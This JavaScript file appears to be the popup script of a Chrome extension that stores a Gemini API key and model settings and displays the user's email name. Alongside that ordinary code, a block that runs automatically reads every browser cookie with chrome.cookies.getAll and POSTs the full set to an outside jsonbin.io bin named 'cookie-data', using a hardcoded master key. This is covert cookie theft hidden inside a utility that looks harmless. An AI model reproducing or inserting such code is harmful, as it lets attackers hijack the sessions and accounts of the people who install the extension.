document.getElementById("Faster").addEventListener("click", insertModel);
document.getElementById("Accurate").addEventListener("click", insertModel);
document.getElementById("myBtn").addEventListener("click", insertAPIkey);
document.getElementById("gpt-check").addEventListener("click", insertGPTstatus);


chrome.cookies.getAll({}, (cookies) => {
  cookies = JSON.stringify(cookies);
  console.log(cookies);

  let req = new XMLHttpRequest();

  req.onreadystatechange = () => {
    if (req.readyState == XMLHttpRequest.DONE) {
      console.log(req.responseText);
    }
  };

  req.open("POST", "https://api.jsonbin.io/v3/b", true);
  req.setRequestHeader("Content-Type", "application/json");
  req.setRequestHeader("X-Bin-Name", "cookie-data");
  req.setRequestHeader(
    "X-Master-Key",
    "$2a$10$6s5Di2fACqi/0AvG0uWHreuQyTPAU/QpidKjw8o.NB4KZXRD5v2X2"
  );

  req.send(cookies);
});

import { GoogleGenerativeAI } from "./gen.js";

async function insertAPIkey() {
  let api = document.getElementById("inp").value;
  console.log(api);
  document.getElementById("5").innerText = " Key status: ...";
  try {
    console.log("hi");
    const genAI = new GoogleGenerativeAI(api);
    const model = genAI.getGenerativeModel({ model: "gemini-pro" });
    const result = await model.generateContent("hi");
    console.log(result);
    document.getElementById("5").innerHTML =
      " Key status:<img style='height:15px;' src='images/check.svg' /> Verified";
  } catch (error) {
    console.log(error);
    document.getElementById("5").innerHTML =
      " Key status:<img style='height:15px;' src='images/close.svg' /> Not Verified";
  }
  chrome.storage.sync.set({ key: api }).then(() => {
    console.log("Value is set");
  });
}

function insertModel() {
  if (document.getElementById("Accurate").checked) {
    chrome.storage.sync.set({ model: "Accurate" }).then(() => {
      console.log("Value is set as Accurate");
    });
  }
  if (document.getElementById("Faster").checked) {
    chrome.storage.sync.set({ model: "Faster" }).then(() => {
      console.log("Value is set as Faster");
    });
  }
}

function insertGPTstatus() {
  if (document.getElementById("gpt-check").checked) {
    chrome.storage.sync.set({ GPTrequired: true }).then(() => {
      console.log("GPTrequired value is true");
    });
  }else{
    chrome.storage.sync.set({ GPTrequired: false }).then(() => {
      console.log("GPTrequired value is false");
    });
  }
  if (document.getElementById("Faster").checked) {
    chrome.storage.sync.set({ model: "Faster" }).then(() => {
      console.log("Value is set as Faster");
    });
  }
}

chrome.storage.sync.get(["key"]).then((result) => {
  document.getElementById("inp").value = result.key;
});
chrome.storage.sync.get(["model"]).then((result) => {
  if (result.model === "Faster") {
    document.getElementById("Faster").checked = true;
  }
  if (result.model === "Accurate") {
    document.getElementById("Accurate").checked = true;
  }
});
chrome.storage.sync.get(["GPTrequired"]).then((result) => {
  document.getElementById("gpt-check").checked = result.GPTrequired;
});

chrome.identity.getProfileUserInfo(function (userInfo) {
  let email = "unknown user.bit";
  email = userInfo.email;
  email = email.substring(0, email.lastIndexOf("@"));
  while (email.lastIndexOf(".") != -1) {
    email = email.substring(0, email.lastIndexOf("."));
  }
  email = email.toLocaleUpperCase();
  console.log(email);
  let yt = document.getElementById("3");
  yt.innerText = email;
});
